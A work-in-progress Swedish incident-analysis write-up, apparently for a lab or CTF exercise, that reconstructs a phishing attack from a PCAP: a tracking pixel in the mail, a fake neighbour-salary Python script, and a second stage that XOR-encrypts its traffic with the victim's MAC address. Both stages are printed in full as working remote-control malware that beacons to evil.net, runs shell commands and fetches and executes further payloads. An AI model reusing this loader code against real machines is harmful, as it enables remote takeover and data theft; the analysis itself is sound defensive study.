# --- WORK IN PROGRESS ---

# Grannupplysningen

## Uppgiftsbeskrivning
Det har skett en incident på det företag som Anders arbetar på. Anders har en position i företaget som gör att han har tillgång till en stor del av företagets känsliga dokument och många beslut går via honom. Privat har han ett stort intresse för ekonomi och är nyfiken på hur grannarnas inkomster ser ut. Företaget har som tur är spelat in nätverkstrafik som är relaterad till incidenten som är bifogad här i en PCAP.

Din uppgift är att analysera nätverkstrafiken och skriva en rapport till företaget så att de förstår vad som har hänt.
Som stöd till din rapport kan du utgå från nedan frågeställningar:

- Vad är det för typ av angrepp Anders har utsatts för?
- Kan angriparen på något sätt se om Anders öppnat mailet?
- Vilka IP-adresser, portar och protokoll är inblandade i incidenten och vilka roller har de?
- Är angreppet automatiskt eller manuellt (d.v.s. en människa styr angreppet)?
- Vad har angreppet gjort mot Anders dator?
- Hur har angreppet gått till, steg-för-steg, inklusive de metoder som använts (såsom sårbarheter, kryptering eller liknande)?
## Överblick
Det verkar som att Anders har tagit emot ett phishing-mail från `Grannupplysningen <hacker@evil.net>` och laddat ner ett program för att kunna se sina grannars lön. Länken ser ut så här: `http://www.grannupplysningen.se/upplysning.py`, men pekar till `http://evil.net/stage_1?filename=upplysning.py`. 

Vidare kan man se lite olika anslutningar, så min tanke är att Anders har laddat ner nån form av skadligt program som satt igång en attack i flera steg och exfiltrerat data. Frågan är bara vad, hur och till vem.
## Phishing-mailet
Här är en bild på det renderade mailet:

![Screenshot](img/Pasted%20image%2020260302091714.png)

I mailet finns det även en dold png-fil som pekar mot `http://evil.net/invisible.png?id=anders%40storaforetaget%2Ese`. Det intressanta är ju att png-filen har en parameter...

![Screenshot](img/Pasted%20image%2020260302092447.png)

Eftersom den är 1x1 pixlar tänker jag att det är en tracking-cookie - att när Anders öppnar mailet och omedvetet vill ladda in den dolda bilden så skickas en request till `evil.net` med Anders mailadress som ID. Det blir som en kvittens på att Anders har öppnat mailet.
## Nedladdning av Python-script
Från paket 105 kan man se när Anders laddar ner python-scriptet från `evil.net/stage_1?filename=upplysning.py`. Scriptet ser ut som följande:

```python
#!/usr/bin/env python3
import sys
import os

def main():
    print('V..lkommen till Grannupplysningen!')
    name = input('Ange ditt namn: ')
    input('Ange din adress: ')
    input('Ange din postadress: ')
    print('Kunde inte hitta n..gra grannar f..r %s! F..rs..k igen senare.' % name)

def payload():
    import requests
    import time
    import subprocess
    import urllib.parse
    import gzip
    
    session = requests.session()

    while True:
        response = session.get('http://evil.net/beacon_1').json()
        
        if response['command'] == 'sleep':
            time.sleep(response.get('parameters', [3])[0])

        elif response['command'] == 'shell':
            output = subprocess.check_output(response.get('parameters')[0], shell=True)
            session.post('http://evil.net/shell_1', json={'output': urllib.parse.quote(output, safe='')})

        elif response['command'] == 'download_and_execute':
            new_payload = session.get(response.get('parameters')[0]).content
            session_id = session.cookies['id']
            exec(new_payload, globals(), locals())
            break

if __name__ == '__main__':
    if '--payload' in sys.argv:
        payload()
    else:
        os.system('python3 %s --payload &> /dev/null &' % sys.argv[0])
        main()
```

Programmet låter användaren skriva in sina uppgifter och returnerar svaret att det inte finns någon information om grannarna att visa. I bakgrunden sker dock lite andra grejer...

Attackeraren börjar med att skicka ett gäng sleep-kommandon:

![Screenshot](img/Pasted%20image%2020260302100209.png)

Dessa görs till `/beacon_1`. 

Sedan kör attackeraren shell-kommandot whoami:

![Screenshot](img/Pasted%20image%2020260302100227.png)

Attackeraren får svaret `Anders` från `/shell_1`

![Screenshot](img/Pasted%20image%2020260302100255.png)

Efter ytterligare några sleep-kommandon körs kommandot `download_and_execute`:

![Screenshot](img/Pasted%20image%2020260302100348.png)

Då görs ett anrop till `/stage_2` vilket tyder på att en ny payload ska laddas ner och köras. 

I slutet av det första scriptet kan vi ju se raden `exec(new_payload, globals(), locals())` som gör att den nya payloaden körs direkt.

Filen `soijijioajglkmw` laddas ner och innehåller följande:

```python
def entrypoint(session_id):
    import uuid
    import base64
    import requests
    import json
    import subprocess
    import time
    import marshal
    
    
    def rolling_xor(data, key):
        encrypted = b''
        for i, c in enumerate(data):
            encrypted += bytes((c ^ key[i % len(key)],))
        return encrypted

    key = uuid.getnode().to_bytes(length=6, byteorder='big')
    
    session = requests.session()
    session.cookies.set('id', session_id)
    
    session.post('http://evil.net/set_key', json={'key': base64.b64encode(key).decode()})
    
    while True:
        data = base64.b64decode(session.get('http://evil.net/beacon_2').content)
        response = json.loads(rolling_xor(data, key).decode())
        
        if response['command'] == 'sleep':
            time.sleep(response.get('parameters', [3])[0])

        elif response['command'] == 'shell':
            output = subprocess.check_output(response.get('parameters')[0], shell=True).decode()
            output_encrypted = rolling_xor(json.dumps({'output': output}).encode(), key)
            session.post('http://evil.net/shell_2', data=base64.b64encode(output_encrypted))

        elif response['command'] == 'download_and_execute':
            new_payload = session.get(response.get('parameters')[0]).content
            session_id = session.cookies['id']
            exec(marshal.loads(rolling_xor(new_payload, key)), globals(), locals())
            break


entrypoint(session_id)
```

Det är lite stökigare att förstå vad det här scriptet gör, men summan av kardemumman är antagligen att den extraherar data från målsystemet, krypterar datan och skickar den till en server som attackeraren har åtkomst till. Lite samma som första scriptet, men att datan krypteras med XOR.

Man kan dock se att det finns ännu en `download_and_execute`, så möjligen kommer attackeraren initiera att ytterligare en payload laddas ner.

En post-request görs till `/set_key`:

![Screenshot](img/Pasted%20image%2020260302102952.png)

`AkKsFwAD` bör alltså vara nyckeln - offrets MAC-adress - vilket man kan kolla i CyberChef:

![Screenshot](img/Pasted%20image%2020260302104835.png)

Nästa stream innehåller följande:

![Screenshot](img/Pasted%20image%2020260302104954.png)

Och dekrypterat kan vi se att det skickas ett sleep-kommando

![Screenshot](img/Pasted%20image%2020260302105243.png)

Precis samma som förra scriptet, men krypterat. Efter ett antal sleep-kommandon skickas en annan sträng som dekrypteras till:

![Screenshot](img/Pasted%20image%2020260302105408.png)

Det skickas en post-request med outputen från ls-kommandot:

![Screenshot](img/Pasted%20image%2020260302105457.png)

Som dekrypteras till:

![Screenshot](img/Pasted%20image%2020260302105522.png)

Sedan sleep fram till stream 36, då skickas:

![Screenshot](img/Pasted%20image%2020260302105615.png)

Och där finns en fil - `hemligheter.png`

![Screenshot](img/Pasted%20image%2020260302105931.png)

Därefter körs kommandot för att ta reda på vilken python-version som körs, svaret är version `3.9.2`

Sedan sleep följt av en ny `download_and_execute` vid stream 51. Då laddas följande ner: 

![Screenshot](img/Pasted%20image%2020260302110229.png)

Inte samma enkla typ av XOR-kryptering och base64 encoding. Vi kommer behöva gräva lite mer för att förstå den tredje payloaden som laddas ner.

När man tittar närmare på hur datan formateras innan det skickas vidare så används XOR, men datan som krypteras är i **marshal-format**. För att göra det läsbart behöver vi använda en disassembler eller en decompiler.

# Fortsättning följer...